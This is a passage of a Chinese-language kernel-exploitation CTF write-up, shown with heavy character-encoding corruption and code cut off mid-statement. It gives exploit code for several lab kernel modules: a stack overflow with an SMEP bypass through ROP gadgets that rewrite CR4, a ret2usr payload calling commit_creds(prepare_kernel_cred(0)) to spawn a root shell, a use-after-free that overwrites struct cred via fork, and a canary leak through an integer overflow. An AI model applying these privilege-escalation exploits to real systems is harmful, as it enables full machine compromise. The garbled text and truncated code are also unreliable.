    #include 
    int main(void){
        char Send_data[0x30];
        char Padding[0x29] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char Eip[4] = "xEFxBExADxDE";
        strcat(Send_data,Padding);
        strcat(Send_data,Eip);
        int fd = open("/dev/bof",2);
        write(fd,Send_data,0x30);
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
å‘ç°ç¬¦åˆé¢„æœŸã€‚
é‚£ä¹ˆå› ä¸º`SMEP`çš„å­˜åœ¨æˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨å’Œ`Buffer overflow basic
1`ç›¸åŒçš„æ€è·¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œå®Œ`commit_creds(prepare_kernel_cred(0));`åå°†ä¸è¢«å…è®¸ç»§ç»­æ‰§è¡Œç”¨æˆ·æ€ä»£ç ã€‚
###  Bypass SMEP
å†…æ ¸æ˜¯æ ¹æ®`CR4`å¯„å­˜å™¨çš„å€¼æ¥åˆ¤æ–­`smep`ä¿æŠ¤æ˜¯å¦å¼€å¯çš„ï¼Œå½“`CR4`å¯„å­˜å™¨çš„ç¬¬`20`ä½æ˜¯`1`æ—¶ï¼Œä¿æŠ¤å¼€å¯ï¼›æ˜¯`0`æ—¶ï¼Œä¿æŠ¤å…³é—­ã€‚ä»¥ä¸‹æ˜¯`CR4`å¯„å­˜å™¨çš„å„æ ‡å¿—ä½ï¼š
é‚£ä¹ˆï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­å­˜åœ¨`gadget`èƒ½è®©æˆ‘ä»¬ä¿®æ”¹`CR4`å¯„å­˜å™¨çš„å€¼æˆ‘ä»¬å°±å¯ä»¥æ‰‹åŠ¨æ¥å…³é—­`SMEP`ä¿æŠ¤äº†ã€‚
é¦–å…ˆæˆ‘ä»¬éœ€è¦ä»`bzImage`ä¸­æå–é™æ€ç¼–è¯‘æœªç»è¿‡å‹ç¼©çš„`kernel`æ–‡ä»¶ï¼Œä»¥ååŠ©æˆ‘ä»¬æ‰¾åˆ°åˆé€‚çš„`gadget`ã€‚
è¿™é‡Œä½¿ç”¨[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)æ¥æå–ï¼Œä½¿ç”¨å‘½ä»¤ä¸º:`./extract-vmlinux bzImage > vmlinux`
æ¥ä¸‹æ¥ç”±äº`vmlinux`è¿‡å¤§ï¼Œå› æ­¤å»ºè®®æŠŠåˆ†æå‡ºçš„`gadget`é‡å®šå‘åˆ°æ–‡ä»¶ç„¶ååœ¨æ–‡ä»¶ä¸­å¯»æ‰¾`gadget`è€Œä¸æ˜¯ç›´æ¥ä»¥æ ‡å‡†è¾“å‡ºæ‰“å°ï¼Œå‘½ä»¤ä¸º`ROPgadget
--binary ./vmlinux > gadgets`ã€‚
å‘ç°ç¨‹åºä¸­æœ‰å››ä¸ª`mov cr4,eax`çš„`gadget`ï¼ŒåŒæ—¶ä¹Ÿæœ‰`pop
eax`çš„`gadget`ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ª`gadget`æ§åˆ¶`cr4`å¯„å­˜å™¨çš„å€¼ä¸º`0x6d0`è¿›è€Œå…³é—­`SMEP`ä¿æŠ¤äº†ã€‚
äºæ˜¯æˆ‘ä»¬æœ€ç»ˆé€‰ç”¨çš„ä¸¤ä¸ª`gadget`åˆ†åˆ«ä¸ºï¼š
    0xc10174fc : pop eax ; ret
    0xc1045053 : mov cr4, eax ; pop ebp ; ret
äºæ˜¯æ­¤æ—¶çš„PoCä¸ºï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00xEFxBExADxDE";
        for(int i = 0,j = 56;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00";
        for(int i = 0,j = 56;i /dev/console
    exec 2>/dev/console
    insmod /lib/modules/4.4.72/babydriver.ko
    chmod 777 /dev/babydev
    echo -e "nBoot took $(cut -d' ' -f1 /proc/uptime) secondsn"
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    poweroff -d 0  -f
å‘ç°æœ¬æ¬¡çš„æ–‡ä»¶ç³»ç»Ÿæ²¡æœ‰åŠ è½½å…±äº«æ–‡ä»¶å¤¹ï¼Œè¿™å°†å¯¼è‡´æˆ‘ä»¬æ¯æ¬¡å†™å®Œ`PoC`éƒ½éœ€è¦å°†`PoC`é‡æ‰“åŒ…è¿›æ–‡ä»¶ç³»ç»Ÿã€‚
ğŸš«ï¼šç»è¿‡è¿›ä¸€æ­¥æµ‹è¯•å‘ç°ï¼ŒKernelæ–‡ä»¶ä¸æ”¯æŒ9pé€‰é¡¹ï¼Œå› æ­¤æ— æ³•é€šè¿‡ä¿®æ”¹`Init`çš„æ–¹å¼æ¥æŒ‚è½½å…±äº«æ–‡ä»¶å¤¹ã€‚
ç„¶åæˆ‘ä»¬éœ€è¦é‡æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨å‘½ä»¤`find . | cpio -o --format=newc > rootfs.cpio`ã€‚
###  è°ƒè¯•ä¿¡æ¯
`QEMU`å¯åŠ¨æŒ‡ä»¤ï¼š
    qemu-system-x86_64 -s 
    -initrd rootfs.cpio 
    -kernel bzImage 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/babydriver/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
å› ä¸º`boot.sh`ä¸­æ¶‰åŠåˆ°äº†`KVM`æŠ€æœ¯ï¼Œè€Œåœ¨è™šæ‹Ÿæœºä¸­çš„Ubuntuå†å¯åŠ¨è™šæ‹ŸåŒ–æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä¿®æ”¹å¯åŠ¨æŒ‡ä»¤ä¸ºä»¥ä¸ŠæŒ‡ä»¤ã€‚
###  LKMsæ–‡ä»¶åˆ†æ
####  é¢˜ç›®é€»è¾‘åˆ†æ
å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜ä¸­æä¾›äº†`ioctl`å‡½æ•°ï¼Œè¿™ç»™äº†æˆ‘ä»¬æ›´å¤šçš„äº¤äº’æ–¹å¼ã€‚
#####  babyioctl
ç¨‹åºå®šä¹‰äº†ä¸€ä¸ªå‘½ä»¤ç `0x10001`ï¼Œåœ¨è¿™ä¸ªå‘½ä»¤ç ä¸‹ï¼Œç¨‹åºå°†ä¼šé‡Šæ”¾`device_buf`æŒ‡å‘çš„`Chunk`ï¼Œå¹¶ä¸”ç”³è¯·ä¸€ä¸ªç”¨æˆ·ä¼ å…¥å¤§å°çš„`Chunk`ç»™`device_buf`ï¼Œç„¶åå°†è¿™ä¸ªå¤§å°èµ‹ç»™`device_buf_len`ã€‚
#####  babyopen
åœ¨æ‰“å¼€è®¾å¤‡æ—¶ï¼Œç¨‹åºå³ä¼šç”³è¯·ä¸€ä¸ª64å­—èŠ‚å¤§å°çš„`Chunk`ç»™`device_buf`ï¼Œç„¶åå°†è¿™ä¸ªå¤§å°èµ‹ç»™`device_buf_len`ã€‚
#####  babywrite
å‘`device_buf`æŒ‡å‘çš„`Chunk`å†™å…¥å€¼ï¼Œå†™å…¥é•¿åº¦ä¸å¾—è¶…è¿‡`device_buf_len`ã€‚
#####  babyread
ä»`device_buf`æŒ‡å‘çš„`Chunk`å‘ç”¨æˆ·è¿”å›å€¼ï¼Œè¿”å›é•¿åº¦ä¸å¾—è¶…è¿‡`device_buf_len`ã€‚
#####  babyrelease
é‡Šæ”¾`device_buf`æŒ‡å‘çš„`Chunk`ã€‚
####  é¢˜ç›®æ¼æ´åˆ†æ
å¯ä»¥å‘ç°ï¼Œæœ¬æ¬¡é¢˜ç›®ä¸­çš„å‡½æ•°æ²¡æœ‰ä¹‹å‰è§åˆ°è¿‡çš„æ ˆæº¢å‡ºæˆ–è€…ç©ºæŒ‡é’ˆå¼•ç”¨ç­‰æ¼æ´ã€‚
éœ€è¦æ³¨æ„ï¼Œåœ¨Kernelä¸­ï¼Œå¦‚æœç”¨æˆ·æ€ç¨‹åºå¤šæ¬¡æ‰“å¼€åŒä¸€ä¸ªå­—ç¬¦è®¾å¤‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦è®¾å¤‡çš„çº¿ç¨‹å®‰å…¨å°†ç”±å­—ç¬¦è®¾å¤‡æœ¬èº«æ¥ä¿è¯ï¼Œå³æœ‰æ²¡æœ‰åœ¨openå‡½æ•°ç›¸å…³ä½ç½®è¿›è¡Œäº’æ–¥é”çš„è®¾ç½®ç­‰ã€‚è¿™ä¸ªé¢˜ç›®ç»™å‡ºçš„è®¾å¤‡æ˜¾ç„¶æ²¡æœ‰å®ç°ç›¸å…³æœºåˆ¶ã€‚
é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬æ‰“å¼€ä¸¤æ¬¡`LKMs`ï¼Œä¸¤ä¸ª`LKMs`çš„`babydev_struct.device_buf`å°†æŒ‡å‘åŒä¸€ä¸ªä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåä¸€ä¸ªLKMsçš„`babydev_struct.device_buf`å°†è¦†ç›–å‰ä¸€ä¸ªLKMsçš„`babydev_struct.device_buf`ã€‚è‹¥æ­¤æ—¶ç¬¬ä¸€ä¸ª`LKMs`æ‰§è¡Œäº†é‡Šæ”¾æ“ä½œï¼Œé‚£ä¹ˆç¬¬äºŒä¸ª`LKMs`çš„`babydev_struct.device_buf`äº‹å®ä¸Šå°†æŒ‡å‘ä¸€å—å·²ç»è¢«é‡Šæ”¾äº†çš„å†…å­˜ï¼Œè¿™å°†å¯¼è‡´`Use-After-Free`æ¼æ´çš„å‘ç”Ÿã€‚
æˆ‘ä»¬åœ¨Kernel Pwn å­¦ä¹ ä¹‹è·¯(ä¸€)ä¸­è¯´æ˜è¿‡ä¸€ä¸ª`struct cred -è¿›ç¨‹æƒé™ç»“æ„ä½“`ï¼Œå®ƒå°†è®°å½•æ•´ä¸ªè¿›ç¨‹çš„æƒé™ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬èƒ½å°†è¿™ä¸ªç»“æ„ä½“ç¯¡æ”¹äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æå‡æ•´ä¸ªè¿›ç¨‹çš„æƒé™ï¼Œè€Œç»“æ„ä½“å¿…ç„¶éœ€è¦é€šè¿‡å†…å­˜åˆ†é…ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨`forkå‡½æ•°`å°†ä¸€ä¸ªè¿›ç¨‹åˆ†è£‚å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ­¤æ—¶ï¼Œçˆ¶è¿›ç¨‹å°†ä¸å­è¿›ç¨‹å…±äº«å†…å­˜ç©ºé—´ï¼Œè€Œå­è¿›ç¨‹è¢«åˆ›å»ºæ—¶å¿…ç„¶ä¹Ÿè¦åˆ›å»ºå¯¹åº”çš„`struct
cred`ï¼Œæ­¤æ—¶å°†ä¼šæŠŠç¬¬äºŒä¸ª`LKMs`çš„`babydev_struct.device_buf`æŒ‡å‘çš„å·²é‡Šæ”¾çš„å†…å­˜åˆ†é…èµ°ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹`struct
cred`äº†ã€‚
###  Final Exploit
æ ¹æ®æˆ‘ä»¬çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å‡ºä»¥ä¸‹çš„Expliotï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main()
    {
        int fd1 = open("/dev/babydev", 2);
        int fd2 = open("/dev/babydev", 2);
        // ä¿®æ”¹device_buf_len ä¸º sizeof(struct cred)
        ioctl(fd1, 0x10001, 0xA8);
        // é‡Šæ”¾fd1ï¼Œæ­¤æ—¶ï¼ŒLKMs2çš„device_bufå°†æŒ‡å‘ä¸€å—å¤§å°ä¸ºsizeof(struct cred)çš„å·²freeçš„å†…å­˜
        close(fd1);
        // æ–°èµ·è¿›ç¨‹çš„ cred ç©ºé—´å°†å ç”¨é‚£ä¸€å—å·²freeçš„å†…å­˜
        int pid = fork();
        if(pid /dev/null
æœ¬é¢˜ä¾ç„¶æ²¡æœ‰ç»™å‡ºå…±äº«æ–‡ä»¶å¤¹ï¼Œå› æ­¤ä»éœ€è¦åœ¨åˆ©ç”¨æ—¶é‡æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿã€‚
Kernelå¼€å¯äº†`SEMP`ã€`SAMP`ã€`KASLR`ä¿æŠ¤ã€‚
###  LKMsæ–‡ä»¶åˆ†æ
`LKMs`æ–‡ä»¶å¯åŠ¨äº†`Canary`é˜²æŠ¤ã€‚
####  é¢˜ç›®é€»è¾‘åˆ†æ
#####  babyhacker_ioctl
ç¨‹åºå®šä¹‰äº†ä¸‰ä¸ªå‘½ä»¤ç `0x30000`ã€`0x30001`ã€`0x30002`ã€‚
åœ¨`0x30000`å‘½ä»¤ç ä¸‹ï¼Œç¨‹åºä¼šå°†`buffersize`ç½®ä¸ºæˆ‘ä»¬è¾“å…¥çš„å‚æ•°ã€‚(æœ€å¤§ä¸º10)
åœ¨`0x30001`å‘½ä»¤ç ä¸‹ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‚æ•°å†™åˆ°æ ˆä¸Šã€‚
åœ¨`0x30002`å‘½ä»¤ç ä¸‹ï¼Œç¨‹åºä¼šå°†æ ˆä¸Šæ•°æ®è¾“å‡ºã€‚
####  é¢˜ç›®æ¼æ´åˆ†æ
å½“æˆ‘ä»¬è®¾ç½®å‚æ•°æ—¶ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥è½¬ä¸ºæœ‰ç¬¦å·æ•´æ•°è¿›è¡Œä¸Šé™æ£€æŸ¥ï¼Œè€Œæ²¡æœ‰è¿›è¡Œä¸‹é™æ£€æŸ¥ï¼Œè¿™ä¼šå¯¼è‡´æ•´æ•°æº¢å‡ºçš„å‘ç”Ÿã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„`buffersize`ä¸º-1æ—¶ï¼Œæˆ‘ä»¬äº‹å®ä¸Šå¯ä»¥å¯¹æ ˆä¸Šå†™å…¥ä¸€ä¸ªæå¤§å€¼ã€‚
####  æ³„éœ²æ ˆä¸Šæ•°æ®
ç”±äºç¨‹åºå¼€å¯äº†`KASLR`ä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä»æ ˆä¸Šæ³„éœ²ä¸€äº›æ•°æ®ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹PoCï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    int main()
    {
        char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
        save_status();
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
        // for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
        //     uint64_t tmp = u64(&leak_value[i * 8]);
        //     printf("naddress %d: %pn",i * 8 ,tmp);
        // }
        uint64_t Canary = u64(&leak_value[10 * 8]);
        printf("nCanary: %pn",Canary);
        for(int i = 0 ; i < 40 ; i++ )
            Send_value[i] = 0;
        Send_value[40] = Canary;
        Send_value[41] = 0;
        Send_value[42] = 0xDEADBEEF; 
        ioctl(fd1, 0x30001, Send_value);
        return 0;
    }
é‚£ä¹ˆæŒ‰ç…§é¢„æœŸï¼Œç¨‹åºåº”è¯¥ä¼šå› ä¸ºEIPå¤„ä¸º`0xDEADBEEF`è¿™ä¸ªä¸åˆæ³•åœ°å€è€Œæ–­ç”µã€‚
ç»“æœç¡®å®å¦‚æ­¤ã€‚
####  Bypass SEMP & Bypass kASLR